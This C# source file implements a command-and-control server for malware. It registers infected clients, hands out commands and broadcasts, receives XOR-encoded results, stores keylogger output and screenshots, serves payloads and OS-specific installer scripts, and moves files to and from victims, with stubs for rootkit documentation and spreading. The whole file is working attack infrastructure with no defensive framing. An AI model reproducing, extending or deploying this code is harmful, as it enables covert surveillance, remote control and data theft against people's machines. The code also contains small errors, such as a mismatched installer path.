using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Http;
using Microsoft.Extensions.FileProviders;
using Microsoft.Extensions.Hosting;
using System.Text.Json;
using System.Text;
using System.Net;
using System.Diagnostics;

var builder = WebApplication.CreateBuilder(args);
var app = builder.Build();

// === Paths and Global Config ===
string CURRENT_DIR = AppContext.BaseDirectory;
string CODE_DIR = Path.Combine(CURRENT_DIR, "payloads");
string INSTALLER_DIR = Path.Combine(CURRENT_DIR, "installers");
string UPLOAD_DIR = Path.Combine(CURRENT_DIR, "uploads");
string SCREENSHOTS_DIR = Path.Combine(CURRENT_DIR, "screenshots");

Directory.CreateDirectory(CODE_DIR);
Directory.CreateDirectory(INSTALLER_DIR);
Directory.CreateDirectory(UPLOAD_DIR);
Directory.CreateDirectory(SCREENSHOTS_DIR);

string? selected_code_file = null;
bool forwarded = false;
int port = 7777;

Dictionary<string, object> clients = new();
string current_cmd = "";
string last_result = "";

// === Helper Functions ===
string GetPublicIp()
{
    try
    {
        using var client = new HttpClient();
        var response = client.GetStringAsync("https://api.ipify.org?format=text").Result;
        return response;
    }
    catch (Exception e)
    {
        return $"Error: {e.Message}";
    }
}

string GetLocalIp()
{
    try
    {
        using var socket = new System.Net.Sockets.Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0);
        socket.Connect("8.8.8.8", 80);
        var endPoint = socket.LocalEndPoint as IPEndPoint;
        return endPoint?.Address.ToString() ?? "127.0.0.1";
    }
    catch
    {
        return "127.0.0.1";
    }
}

string Xor(string data, string key = "nullbeacon")
{
    var sb = new StringBuilder();
    for (int i = 0; i < data.Length; i++)
        sb.Append((char)(data[i] ^ key[i % key.Length]));
    return sb.ToString();
}

// === Endpoints ===

app.MapGet("/", async context =>
{
    await context.Response.WriteAsync("Index page (HTML rendering not implemented)");
});

app.MapGet("/dashboard", async context =>
{
    await context.Response.WriteAsync("Dashboard page (HTML rendering not implemented)");
});

app.MapGet("/documentation/payloads", async context =>
{
    if (selected_code_file == null)
    {
        await context.Response.WriteAsync("No payload selected");
        return;
    }
    var stripped = Path.GetFileNameWithoutExtension(selected_code_file);
    await context.Response.WriteAsync($"Payloads doc for: {stripped} (HTML rendering not implemented)");
});

app.MapGet("/documentation/C2", async context =>
{
    await context.Response.WriteAsync("C2 doc (HTML rendering not implemented)");
});

app.MapGet("/documentation/rootkit", async context =>
{
    await context.Response.WriteAsync("Rootkit doc (HTML rendering not implemented)");
});

app.MapPost("/upload", async context =>
{
    var form = await context.Request.ReadFormAsync();
    var file = form.Files["file"];
    if (file != null)
    {
        var filename = $"screenshot_{DateTimeOffset.UtcNow.ToUnixTimeSeconds()}.jpg";
        var path = Path.Combine(SCREENSHOTS_DIR, filename);
        using var stream = File.Create(path);
        await file.CopyToAsync(stream);
        await context.Response.WriteAsync("OK");
    }
    else
    {
        context.Response.StatusCode = 400;
        await context.Response.WriteAsync("No file");
    }
});

app.MapGet("/code", async context =>
{
    if (selected_code_file == null)
    {
        context.Response.StatusCode = 500;
        await context.Response.WriteAsync("No code file selected.");
        return;
    }
    var path = Path.Combine(CODE_DIR, selected_code_file);
    if (!File.Exists(path))
    {
        context.Response.StatusCode = 500;
        await context.Response.WriteAsync("File not found.");
        return;
    }
    var content = await File.ReadAllTextAsync(path);
    context.Response.ContentType = "text/plain";
    await context.Response.WriteAsync(content);
});

app.MapGet("/install", async context =>
{
    var ua = context.Request.Headers["User-Agent"].ToString().ToLower();
    var script = ua.Contains("windows") ? "installer/install.ps1" : "installers/install.sh";
    var path = Path.Combine(CURRENT_DIR, script);
    if (File.Exists(path))
    {
        await context.Response.SendFileAsync(path);
    }
    else
    {
        context.Response.StatusCode = 404;
    }
});

app.MapGet("/clean", async context =>
{
    var path = Path.Combine(CURRENT_DIR, "clean.bat");
    if (File.Exists(path))
    {
        await context.Response.SendFileAsync(path);
    }
    else
    {
        context.Response.StatusCode = 404;
    }
});

app.MapPost("/log", async context =>
{
    var form = await context.Request.ReadFormAsync();
    var raw = form["data"];
    await File.AppendAllTextAsync("keylog.log", raw);
    await context.Response.WriteAsync("OK");
});

app.MapPost("/client_info", async context =>
{
    using var reader = new StreamReader(context.Request.Body);
    var cid = await reader.ReadToEndAsync();
    clients[cid] = new { ip = context.Connection.RemoteIpAddress?.ToString(), last_seen = DateTimeOffset.UtcNow.ToUnixTimeSeconds() };
    Console.WriteLine($"[+] Client {cid} from {context.Connection.RemoteIpAddress}");
    await context.Response.WriteAsync("OK");
});

app.MapGet("/get", async context =>
{
    await context.Response.WriteAsync(current_cmd);
});

app.MapPost("/set", async context =>
{
    using var reader = new StreamReader(context.Request.Body);
    current_cmd = await reader.ReadToEndAsync();
    await context.Response.WriteAsync("OK");
});

app.MapPost("/result", async context =>
{
    using var reader = new StreamReader(context.Request.Body);
    var data = await reader.ReadToEndAsync();
    last_result = Xor(data);
    await context.Response.WriteAsync("OK");
});

app.MapGet("/last", async context =>
{
    await context.Response.WriteAsync(string.IsNullOrEmpty(last_result) ? "[*] No result yet." : last_result);
});

app.MapPost("/upload_file", async context =>
{
    var form = await context.Request.ReadFormAsync();
    var file = form.Files["file"];
    if (file != null)
    {
        var path = Path.Combine(UPLOAD_DIR, file.FileName);
        using var stream = File.Create(path);
        await file.CopyToAsync(stream);
        await context.Response.WriteAsync("OK");
    }
    else
    {
        context.Response.StatusCode = 400;
        await context.Response.WriteAsync("No file");
    }
});

app.MapGet("/download/{filename}", async context =>
{
    var filename = context.Request.RouteValues["filename"]?.ToString();
    if (filename == null)
    {
        context.Response.StatusCode = 400;
        return;
    }
    var path = Path.Combine(UPLOAD_DIR, filename);
    if (File.Exists(path))
    {
        await context.Response.SendFileAsync(path);
    }
    else
    {
        context.Response.StatusCode = 404;
    }
});

app.MapPost("/broadcast", async context =>
{
    using var reader = new StreamReader(context.Request.Body);
    current_cmd = await reader.ReadToEndAsync();
    Console.WriteLine($"[!] Broadcast: {current_cmd}");
    await context.Response.WriteAsync("OK");
});

app.MapPost("/spread", async context =>
{
    Console.WriteLine("[*] Spread called");
    await context.Response.WriteAsync("OK");
});

app.MapGet("/clients", async context =>
{
    var json = JsonSerializer.Serialize(clients.Keys);
    context.Response.ContentType = "application/json";
    await context.Response.WriteAsync(json);
});

// === Main Runner ===
app.Run($"http://0.0.0.0:{port}");
